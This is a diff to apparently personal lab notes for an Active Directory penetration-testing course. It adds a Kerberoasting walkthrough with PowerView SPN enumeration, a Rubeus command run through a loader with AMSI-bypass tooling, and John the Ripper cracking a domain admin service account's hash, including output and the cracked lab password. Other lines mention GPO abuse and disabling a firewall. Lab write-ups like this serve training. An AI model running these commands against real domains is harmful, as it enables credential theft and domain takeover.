@@ -15,7 +15,7 @@
 Find-PSRemotingLocalAdminAccess
 ```
 
-<figure><img src="../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### Connect - 1
 
@@ -26,7 +26,7 @@ set username
 set computername
 ```
 
-<figure><img src="../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### PowerShell Remoting
 
@@ -42,7 +42,105 @@ Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
 $env:username
 ```
 
-<figure><img src="../../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>
+
+***
+
+## Kerberoasting: Abusing Service Principal Names (SPNs) to Crack Service Account Passwords
+
+First, we need to find services running with user accounts as the services running with machine accounts have difficult passwords.
+
+We can use PowerView or ActiveDirectory module for discovering such services:
+
+```
+C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat
+. C:\AD\Tools\PowerView.ps1
+Get-DomainUser -SPN
+```
+
+<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+The `svcadmin`, which is a domain administrator has a SPN set! Let’s Kerberoast it!
+
+> **SPN = Service Principal Name**
+>
+> Es un nombre único que identifica **un servicio** que corre en el dominio.
+>
+> Ejemplos reales del lab:
+>
+> * MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433 → SQL Server
+> * SNMP/ufc-adminsrv.dollarcorp.moneycorp.local → servicio SNMP
+> * HTTP/dcorp-dc.dollarcorp.moneycorp.local → servicio web, etc.
+
+### Rubeus and John the Ripper
+
+> **Regla clave:**
+>
+> * Solo las **cuentas de usuario** (no las de máquina) que tienen un SPN registrado pueden ser Kerberoasteadas fácilmente.
+> * Las cuentas de máquina (dcorp-dc$, etc.) tienen contraseñas muy largas y aleatorias → casi imposibles de crackear.
+
+We can use Rubeus to get hashes for the svcadmin account. Note that we are using the /rc4opsec option that gets hashes only for the accounts that support RC4. This means that if ‘**This account supports Kerberos AES 128/256 bit encryption**’ is set for a service account, the below command will not request its hashes.
+
+> Remember use a invishell
+
+```
+C:\AD\Tools> C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args kerberoast /user:svcadmin /simple /rc4opsec /outfile:C:\AD\Tools\hashes.txt
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.2.1
+[*] Action: Kerberoasting
+[*] Using 'tgtdeleg' to request a TGT for the current user
+[*] RC4_HMAC will be the requested for AES-enabled accounts, all etypes will be requested for everything else
+[*] Target User            : svcadmin
+[*] Target Domain          : dollarcorp.moneycorp.local
+[+] Ticket successfully imported!
+[*] Searching for accounts that only support RC4_HMAC, no AES
+[*] Searching path 'LDAP://dcorp-dc.dollarcorp.moneycorp.local/DC=dollarcorp,DC=moneycorp,DC=local' for '(&(samAccountType=805306368)(servicePrincipalName=*)(samAccountName=svcadmin)(!(UserAccountControl:1.2.840.113556.1.4.803:=2))(!msds-supportedencryptiontypes:1.2.840.113556.1.4.804:=24))'
+
+[*] Total kerberoastable users : 1
+
+[*] Hash written to C:\AD\Tools\hashes.txt
+
+[*] Roasted hashes written to : C:\AD\Tools\hashes.txt
+```
+
+We can now use John the Ripper to brute-force the hashes.
+
+> Please note that you need to remove “**:1433**” from the SPN in hashes.txt before running John
+>
+> `$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433*`&#x20;
+>
+> should be&#x20;
+>
+> `$krb5tgs$23$*svcadmin$dollarcorp.moneycorp.local$MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local*`&#x20;
+>
+> in hashes.txt
+
+<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+
+Run the below command after making above changes:
+
+> It bruteforce the password of it user
+
+```
+C:\AD\Tools> C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
+
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 3 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+*ThisisBlasphemyThisisMadness!!  (?)
+1g 0:00:00:00 DONE (2023-03-03 09:18) 90.90g/s 186181p/s 186181c/s 186181C/s energy..mollie
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+```
+
+<figure><img src="../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
@@ -132,7 +230,7 @@ So... we need o get access like it user or to obtain it execute a command
 
 It turns out that the 'AI' folder is used for testing some automation that executes shortcuts (.lnk files) as the user 'devopsadmin'.&#x20;
 
-<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>
 
 > Recall that we enumerated a user 'devopsadmin' has 'WriteDACL' on DevOps Policy. Let's try to abuse this using GPOddity.
 
@@ -375,11 +473,11 @@ dcorp-appsrv   dcorp\appadmin       False
 ...snip...
 ```
 
-<figure><img src="../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (13).png" alt=""><figcaption></figcaption></figure>
 
 Sweet! There is a <mark style="background-color:red;">domain admin (svcadmin) session on dcorp-mgmt server</mark>! We do not have access to the server but that comes later.
 
-<figure><img src="../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 > We can see if this user is domain admin comparing it to BloodHound
 
@@ -397,7 +495,7 @@ Firstly upload all file to download aftes at us web server
 
 > Remember set off Firewall
 
-<figure><img src="../../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
 
 Now upload all it Into (user RCE jenkings) -OR- RemotingPS obtained GPOddity
 
